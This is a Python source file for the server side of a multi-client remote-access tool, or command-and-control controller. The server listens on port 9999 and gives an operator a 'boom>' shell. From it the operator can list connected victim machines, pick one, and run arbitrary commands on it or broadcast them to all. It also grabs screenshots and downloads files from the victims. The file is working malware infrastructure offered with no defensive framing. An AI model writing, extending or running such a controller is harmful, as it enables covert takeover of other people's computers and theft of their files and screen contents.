import socket
import threading
import sys
import os
import time
from queue import Queue
from colorama import Fore, Style, init
import logging

# Initialize colorama for colored output
init(autoreset=True)

# Setup logging
logging.basicConfig(
    filename="server_logs.log",
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

no_of_threads = 2
queue = Queue()
all_conn = []
all_addr = []

# Socket creation and binding
def socket_create():
    try:
        global host
        global port
        global s
        host = '0.0.0.0'
        port = 9999
        s = socket.socket()
        print(Fore.GREEN + "Socket successfully created")
    except socket.error as msg:
        print(Fore.RED + f"Socket creation error: {msg}")

def socket_bind():
    try:
        global host
        global port
        global s
        s.bind((host, port))
        s.listen(5)
        print(Fore.GREEN + f"Server listening on port {port}")
    except socket.error as msg:
        print(Fore.RED + f"Socket binding error: {msg}\nRetrying...")
        socket_bind()

# Accept connections
def accept_connections():
    for c in all_conn:
        c.close()
    del all_conn[:]
    del all_addr[:]
    while True:
        try:
            conn, addr = s.accept()
            conn.setblocking(1)
            os_name = conn.recv(1024).decode("utf-8")
            all_conn.append((conn, os_name))
            all_addr.append(addr)
            print(Fore.YELLOW + f"\nConnection established: {addr[0]} ({os_name})")
            logging.info(f"New connection from {addr[0]} ({os_name})")
        except Exception as e:
            print(Fore.RED + f"Error accepting connections: {e}")

# Command handling with history and completion
def start_shell():
    from readline import set_completer, parse_and_bind
    import atexit

    # Setup command history
    histfile = ".command_history"
    try:
        import readline
        if os.path.exists(histfile):
            readline.read_history_file(histfile)
        atexit.register(readline.write_history_file, histfile)
    except ImportError:
        pass

    # Setup auto-completion
    def completer(text, state):
        commands = ['list', 'select', 'broadcast', 'quit']
        matches = [cmd for cmd in commands if cmd.startswith(text)]
        return matches[state] if state < len(matches) else None

    set_completer(completer)
    parse_and_bind("tab: complete")

    while True:
        cmd = input(Fore.BLUE + "boom> " + Style.RESET_ALL)
        if cmd == 'list':
            list_connections()
        elif cmd.startswith('select'):
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        elif cmd.startswith('broadcast'):
            broadcast_command(cmd.split(" ", 1)[1])
        elif cmd == 'quit':
            print(Fore.RED + "Shutting down the server.")
            logging.info("Server shutdown.")
            shutdown_server()
            break
        else:
            print(Fore.RED + "Command not recognized")
def shutdown_server():
    for conn, _ in all_conn:
        try:
            conn.close()  # Close all client connections
        except:
            pass
    s.close()  # Close the server socket
    os._exit(0)
    
# List all connections
def list_connections():
    results = ''
    for i, (conn, os_name) in enumerate(all_conn):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del all_conn[i]
            del all_addr[i]
            continue
        results += f"{i} {all_addr[i][0]} {all_addr[i][1]} (OS: {os_name})\n"
    print(Fore.YELLOW + '--------Clients--------\n' + results)

# Get a specific target
def get_target(cmd):
    try:
        target = int(cmd.split(' ')[1])
        conn, os_name = all_conn[target]
        print(Fore.GREEN + f"Connected to {all_addr[target][0]} ({os_name})")
        return conn
    except Exception as e:
        print(Fore.RED + f"Invalid target: {e}")
        return None
# Add this function in your server code to receive the file
def receive_file(conn):
    try:
        # Get the file size first
        file_info = conn.recv(1024).decode()
        filename, file_size = file_info.split(":")
        file_size = int(file_size)
        print(f"File size to be received: {file_size} bytes")
        
        if file_size == 0:
            print(Fore.RED + "File does not exist on the client.")
            return
            
        conn.send("SIZE_RECEIVED".encode())

        # Prepare to receive the file
        with open(filename, "wb") as f:
            print("Receiving file...")
            total_received = 0
            while total_received < file_size:
                data = conn.recv(1024)  # Receive data in chunks of 1024 bytes
                if not data:
                    break
                f.write(data)
                total_received += len(data)
        if total_received == file_size:
            print(Fore.GREEN + f"File received successfully.")
        else:
            print(Fore.RED + "File transfer incomplete.")
    except Exception as e:
        print(Fore.RED + f"Error receiving file: {e}")

# Send commands to target
def send_target_commands(conn):
    conn.send(str.encode("cwd"))
    response = conn.recv(20480).decode("utf-8")
    print(Fore.BLUE + response, end="")
    while True:
        try:
            cmd = input(Fore.CYAN)
            if cmd == "back":  # New command to return to the boom shell without closing the connection
                print(Fore.YELLOW + "Returning to boom shell...")
                break
            elif cmd == "killit":
                conn.send(str.encode(cmd))
                print(Fore.RED + "Connection terminated. Returning to boom shell.")
                conn.close()
                break
            elif cmd.startswith("screenshot"):
                conn.send(str.encode(cmd))
                
                # Receive the file size first
                file_size = int(conn.recv(1024).decode("utf-8"))
                print(Fore.YELLOW + f"Receiving screenshot ({file_size} bytes)...")
                
                # Prepare to receive the screenshot
                received_size = 0
                with open(f"screenshot_{int(time.time())}.png", 'wb') as f:
                    while received_size < file_size:
                        chunk = conn.recv(1024)
                        if not chunk:
                            break
                        f.write(chunk)
                        received_size += len(chunk)
                
                if received_size == file_size:
                    print(Fore.GREEN + "Screenshot received successfully.")
                    response = conn.recv(20480).decode("utf-8")
                    print(Fore.BLUE + response, end="")
                else:
                    print(Fore.RED + "Screenshot transfer incomplete.")
            elif cmd.startswith("download "):
                conn.send(str.encode(cmd))  # Send the command to the client
                time.sleep(1)  # Wait for the client to process
                receive_file(conn)  # Proceed to receive the file
                response = conn.recv(20480).decode("utf-8")
                print(Fore.BLUE + response, end="")

            elif cmd:
                conn.send(str.encode(cmd))
                response = conn.recv(20480).decode("utf-8")
                print(Fore.BLUE + response, end="")
        except Exception as e:
            print(Fore.RED + f"Connection lost: {e}")
            break


# Command broadcasting
def broadcast_command(cmd):
    for conn, os_name in all_conn:
        try:
            # Send the screenshot command to each client
            conn.send(str.encode(cmd))
            print(Fore.YELLOW + f"Broadcasting command to {os_name}...")

            # Check if the command is a screenshot request
            if cmd.startswith("screenshot"):
                # Receive the file size first
                file_size = int(conn.recv(1024).decode("utf-8"))
                print(Fore.YELLOW + f"Receiving screenshot from {os_name} ({file_size} bytes)...")
                
                # Prepare to receive the screenshot
                received_size = 0
                screenshot_filename = f"screenshot_{os_name}_{int(time.time())}.png"
                with open(screenshot_filename, 'wb') as f:
                    while received_size < file_size:
                        chunk = conn.recv(1024)
                        if not chunk:
                            break
                        f.write(chunk)
                        received_size += len(chunk)
                
                if received_size == file_size:
                    print(Fore.GREEN + f"Screenshot from {os_name} received successfully and saved as {screenshot_filename}.")
                else:
                    print(Fore.RED + f"Screenshot transfer from {os_name} incomplete.")
            else:
                # For other commands, just print the response
                response = conn.recv(20480).decode("utf-8")
                print(Fore.CYAN + f"Response from {os_name}:\n{response}")
                
        except Exception as e:
            print(Fore.RED + f"Error broadcasting to {os_name}: {e}")

# Threading
def threads_setup():
    for _ in range(no_of_threads):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()

def work():
    while True:
        x = queue.get()
        if x == 1:
            socket_create()
            socket_bind()
            accept_connections()
        if x == 2:
            start_shell()
        queue.task_done()

def jobs():
    for x in range(1, 3):
        queue.put(x)
    queue.join()

threads_setup()
jobs()

